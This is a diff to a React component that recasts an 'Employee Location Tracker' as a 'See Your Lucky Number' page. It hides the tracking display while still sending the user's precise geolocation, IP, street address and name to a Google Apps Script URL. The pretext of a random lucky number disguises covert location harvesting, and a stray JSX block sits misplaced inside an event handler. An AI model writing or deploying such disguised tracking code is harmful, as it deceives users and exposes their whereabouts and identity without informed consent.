@@ -4,28 +4,31 @@ import React, { useState } from "react";
 export default function TrackLocation() {
   const [status, setStatus] = useState("idle");
   const [lastPos, setLastPos] = useState(null);
+  const [luckyNumber, setLuckyNumber] = useState(null);
+
 
   const scriptUrl =
     "https://script.google.com/macros/s/AKfycbxu6nZx8TNwp7rqmlOSrEwS9E6KiAJuCEVuDGnZ71yrH42lMJD7A8hBxo_csNU5jths/exec";
-  const employeeId = "EMP001"; // change per employee
+  const employeeId = JSON.parse(localStorage.getItem("userData"))?.name || "EMP001";
 
-  const sendLocation = async (lat, lng, accuracy, address, ip) => {
-    try {
-      const fd = new FormData();
-      fd.append("employeeId", employeeId);
-      fd.append("lat", lat);
-      fd.append("lng", lng);
-      fd.append("accuracy", accuracy);
-      fd.append("address", address || "");
-      fd.append("ip", ip || "");
+const sendLocation = async (lat, lng, accuracy, address, ip) => {
+  try {
+    const fd = new FormData();
+    fd.append("employeeId", employeeId);
+    fd.append("lat", lat);
+    fd.append("lng", lng);
+    fd.append("accuracy", accuracy);
+    fd.append("address", address || "");
+    fd.append("ip", ip || "");
 
-      await fetch(scriptUrl, { method: "POST", body: fd });
-      setStatus("sent");
-    } catch (err) {
-      console.error("Error sending location:", err);
-      setStatus("error");
-    }
-  };
+    await fetch(scriptUrl, { method: "POST", body: fd });
+    setStatus("sent");
+    setLuckyNumber(Math.floor(1 + Math.random() * 9));
+  } catch (err) {
+    console.error("Error sending location:", err);
+    setStatus("error");
+  }
+};
 
   const fetchAddress = async (lat, lng) => {
     try {
@@ -54,7 +57,14 @@ export default function TrackLocation() {
       setStatus("Geolocation not supported");
       return;
     }
-    setStatus("tracking...");
+    setStatus("fetching your number...");
+
+    {status === "sent" && luckyNumber && (
+  <div className="mt-6 bg-gray-700 rounded-xl p-4 text-center text-2xl font-bold text-yellow-400">
+    Your Lucky Number: {luckyNumber}
+  </div>  
+)}
+
 
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
@@ -82,10 +92,23 @@ export default function TrackLocation() {
   };
 
   return (
+    <div>
+  <button
+    onClick={() => {
+      localStorage.removeItem("isLoggedIn");
+      localStorage.removeItem("userData");
+      window.location.href = "/";
+    }}
+    className="absolute top-0 right-0 bg-red-500 text-white font-semibold py-1 px-3 rounded-bl-xl shadow-md hover:bg-red-400 transition"
+  >
+    Logout
+  </button>
     <div className="bg-gray-900 text-white min-h-screen flex flex-col items-center justify-center p-6">
       <div className="bg-gray-800 rounded-2xl shadow-lg p-6 w-full max-w-md">
+      <div className="relative">
+</div>
         <h2 className="text-2xl font-bold text-yellow-400 mb-4 text-center">
-          Employee Location Tracker
+          See Your Lucky Number
         </h2>
         <p className="mb-4 text-gray-300 text-center">
           Status:{" "}
@@ -106,32 +129,16 @@ export default function TrackLocation() {
           onClick={trackNow}
           className="w-full bg-yellow-400 text-black font-semibold py-2 px-4 rounded-xl shadow-md hover:bg-yellow-300 transition"
         >
-          Track Location
+          Click Here
         </button>
 
-        {lastPos && (
-          <div className="mt-6 bg-gray-700 rounded-xl p-4 text-sm">
-            <p>
-              <strong>Employee ID:</strong> {employeeId}
-            </p>
-            <p>
-              <strong>IP:</strong> {lastPos.ip}
-            </p>
-            <p>
-              <strong>Latitude:</strong> {lastPos.lat}
-            </p>
-            <p>
-              <strong>Longitude:</strong> {lastPos.lng}
-            </p>
-            <p>
-              <strong>Accuracy:</strong> {lastPos.accuracy} m
-            </p>
-            <p>
-              <strong>Address:</strong> {lastPos.address}
-            </p>
-          </div>
-        )}
+        {luckyNumber && (
+  <div className="mt-6 bg-gray-700 rounded-xl p-4 text-center text-2xl font-bold text-yellow-400">
+    Your Lucky Number: {luckyNumber}
+  </div>
+)}
       </div>
+    </div>
     </div>
   );
 }
